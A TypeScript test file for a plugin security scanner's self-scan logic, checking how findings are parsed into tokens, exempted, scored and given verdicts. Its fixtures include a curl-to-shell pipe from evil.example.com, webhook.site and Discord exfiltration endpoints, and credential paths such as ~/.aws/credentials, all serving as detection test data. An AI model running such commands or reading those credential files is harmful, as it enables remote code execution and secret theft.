import { describe, expect, it } from 'vitest'
import {
  parseTokens, isDeclared, annotateSelfScan, isDetectionDataFile,
  computeSelfScore, computeSelfVerdict,
} from '../lib/report/self-scan.js'
import type { Finding, Severity, Confidence } from '../lib/scanner/protocol.js'

function F(p: {
  rule: string; severity: Severity; message: string; evidence: string;
  confidence?: Confidence; file?: string; line?: number
}): Finding {
  return {
    rule: p.rule, severity: p.severity, message: p.message, evidence: p.evidence,
    confidence: p.confidence ?? 'certain',
    ...(p.file !== undefined ? { file: p.file } : {}),
    ...(p.line !== undefined ? { line: p.line } : {}),
  }
}

describe('parseTokens', () => {
  it('声明模块：识别 child_process 且无其它危险 token', () => {
    const t = parseTokens(F({ rule: 'R3', severity: 'critical', message: '进程访问', evidence: 'child_process', file: 'src/guard/runtime-guard.ts' }))
    expect(t.modules).toContain('child_process')
    expect(t.hosts).toHaveLength(0)
    expect(t.env).toHaveLength(0)
  })
  it('未声明 env：process.env.DEEPSEEK_API_KEY 被提出', () => {
    const t = parseTokens(F({ rule: 'R3', severity: 'critical', message: 'env', evidence: 'process.env.DEEPSEEK_API_KEY', file: 'a.ts' }))
    expect(t.env).toEqual(['DEEPSEEK_API_KEY'])
  })
  it('已声明 env 不产生 token', () => {
    const t = parseTokens(F({ rule: 'R3', severity: 'high', message: 'env', evidence: 'process.env.DSH_PLUGIN_VET_CACHE_DIR', file: 'a.ts' }))
    expect(t.env).toHaveLength(0)
  })
  it('出站 URL：webhook.site 命中', () => {
    const t = parseTokens(F({ rule: 'R13', severity: 'critical', message: '外传', evidence: 'https://webhook.site/collect', file: 'a.ts' }))
    expect(t.hosts).toContain('webhook.site')
  })
  it('回环 IP 不产生 host token', () => {
    const t = parseTokens(F({ rule: 'R15', severity: 'info', message: '网络目标', evidence: 'http://127.0.0.1:8787/x', file: 'a.ts' }))
    expect(t.hosts).toHaveLength(0)
    expect(isDeclared(t as never)).toBe(true)
  })
  it('osv.dev 为声明目标', () => {
    const t = parseTokens(F({ rule: 'OSV', severity: 'high', message: '查询', evidence: 'https://osv.dev/v1/query', file: 'package.json' }))
    expect(t.hosts).toHaveLength(0)
  })
  it('裸 process.env 引用不误判为 .env 凭据文件', () => {
    const f = F({ rule: 'R3', severity: 'info', message: '只读 process 成员（能力触达面）：process.env', evidence: '', file: 'profile-boot.ts', confidence: 'likely' })
    const t = parseTokens(f)
    expect(t.fs).toHaveLength(0)
    expect(t.env).toHaveLength(0)
    expect(isDeclared(f, t)).toBe(true)
  })
  it('真实 .env 文件路径仍命中', () => {
    const t = parseTokens(F({ rule: 'R11', severity: 'high', message: '敏感文件', evidence: 'path/to/.env.production', file: 'a.ts' }))
    expect(t.fs).toContain('.env')
  })
  it('凭据路径段：.aws 命中', () => {
    const t = parseTokens(F({ rule: 'R11', severity: 'high', message: '敏感', evidence: '~/.aws/credentials', file: 'a.ts' }))
    expect(t.fs).toContain('.aws')
  })
  it('shell 管道：curl | sh 命中', () => {
    const t = parseTokens(F({ rule: 'R9', severity: 'critical', message: '表层 shell', evidence: 'curl -s https://evil.example.com | sh', file: 'a.ts' }))
    expect(t.spawn).toContain('shell-pipe')
  })
  it('IPC 禁区：worker_threads 命中', () => {
    const t = parseTokens(F({ rule: 'R3', severity: 'critical', message: '线程', evidence: "require('worker_threads')", file: 'a.ts' }))
    expect(t.modules).toContain('worker_threads')
  })
})

describe('annotateSelfScan', () => {
  it('pinned：已声明模块 finding → declared、verdict clean、score 100', () => {
    const info = annotateSelfScan([
      F({ rule: 'R3', severity: 'critical', message: '进程访问', evidence: 'child_process', file: 'src/guard/runtime-guard.ts', confidence: 'certain' }),
    ], { pin: 'pinned-match' })
    expect(info.annotation.declared).toBe(1)
    expect(info.annotation.retained).toHaveLength(0)
    expect(info.verdict).toBe('clean')
    expect(info.staticScore).toBe(100)
  })
  it('pinned 也保留未声明 env（有界豁免）', () => {
    const info = annotateSelfScan([
      F({ rule: 'R3', severity: 'critical', message: 'env', evidence: 'process.env.DEEPSEEK_API_KEY', file: 'a.ts', confidence: 'certain' }),
    ], { pin: 'pinned-match' })
    expect(info.annotation.retained).toHaveLength(1)
    expect(info.annotation.retained[0].severity).toBe('critical')
    expect(info.verdict).toBe('critical')
  })
  it('pinned 也保留出站外传 host（核心边界）', () => {
    const info = annotateSelfScan([
      F({ rule: 'R13', severity: 'critical', message: '外传', evidence: 'https://webhook.site/x', file: 'a.ts', confidence: 'certain' }),
    ], { pin: 'pinned-match' })
    expect(info.annotation.retained).toHaveLength(1)
    expect(info.annotation.retained[0].severity).toBe('critical')
    expect(info.verdict).toBe('critical')
  })
  it('数据集自引用：仅 pinned-match 豁免文件级', () => {
    const f = F({ rule: 'R14', severity: 'critical', message: '规则数据', evidence: 'curl | sh', file: 'scanner-bin/rules/non-js-scripts.ts', confidence: 'certain' })
    const pinned = annotateSelfScan([f], { pin: 'pinned-match' })
    expect(pinned.annotation.datasetSelfRef).toBe(1)
    expect(pinned.annotation.retained).toHaveLength(0)
    const dev = annotateSelfScan([f], { pin: 'dev-tree' })
    expect(dev.annotation.datasetSelfRef).toBe(0)
    expect(dev.annotation.retained).toHaveLength(1) // shell-pipe 不豁免
    expect(dev.verdict).toBe('critical')
  })
  it('verdict 只由 retained 的 decisive 决定', () => {
    const info = annotateSelfScan([
      F({ rule: 'R3', severity: 'high', message: '进程', evidence: 'child_process', file: 'a.ts', confidence: 'certain' }),
      F({ rule: 'R3', severity: 'high', message: '未知 env', evidence: 'process.env.SECRET_TOKEN', file: 'a.ts', confidence: 'certain' }),
    ], { pin: 'pinned-match' })
    expect(info.annotation.declared).toBe(1)
    expect(info.annotation.retained).toHaveLength(1)
    expect(info.verdict).toBe('suspicious') // 1×high×certain → 扣 20
    expect(info.staticScore).toBe(80)
  })
  it('开发夹具（test/spec）：仅 pinned-match 豁免', () => {
    const f = F({ rule: 'R13', severity: 'high', message: '外传端点', evidence: 'https://discord.com/api/webhooks/xxx', file: 'test/r13-r14.test.ts', confidence: 'certain' })
    const pinned = annotateSelfScan([f], { pin: 'pinned-match' })
    expect(pinned.annotation.devFixtures).toBe(1)
    expect(pinned.annotation.retained).toHaveLength(0)
    expect(pinned.verdict).toBe('clean')
    const dev = annotateSelfScan([f], { pin: 'dev-tree' })
    expect(dev.annotation.devFixtures).toBe(0)
    expect(dev.annotation.retained).toHaveLength(1)
    expect(dev.verdict).toBe('suspicious')
  })
  it('元信息透传：version / pin / isTrustLayer', () => {
    const info = annotateSelfScan([], { pin: 'pinned-match', version: '0.1.21', isTrustLayer: true })
    expect(info.isTrustLayer).toBe(true)
    expect(info.version).toBe('0.1.21')
    expect(info.pin).toBe('pinned-match')
  })
  it('isDetectionDataFile 按 basename 判', () => {
    expect(isDetectionDataFile('scanner-bin/rules/non-js-scripts.ts')).toBe(true)
    expect(isDetectionDataFile('src/guard/honeypot.ts')).toBe(true)
    expect(isDetectionDataFile('src/client/i18n.ts')).toBe(true)
    expect(isDetectionDataFile('src/guard/runtime-guard.ts')).toBe(false)
    expect(isDetectionDataFile(undefined)).toBe(false)
  })
})

describe('computeSelfScore（与 scanner-bin/score.ts 镜像）', () => {
  it('2 × critical certain → 10', () => {
    expect(computeSelfScore([
      F({ rule: 'R1', severity: 'critical', message: 'a', evidence: 'a' }),
      F({ rule: 'R1', severity: 'critical', message: 'b', evidence: 'b' }),
    ])).toBe(10)
  })
  it('纯 info/heuristic → clean 100', () => {
    const findings = [F({ rule: 'R8', severity: 'info', message: 'skip', evidence: '', confidence: 'heuristic' })]
    expect(computeSelfVerdict(findings)).toBe('clean')
    expect(computeSelfScore(findings)).toBe(100)
  })
})
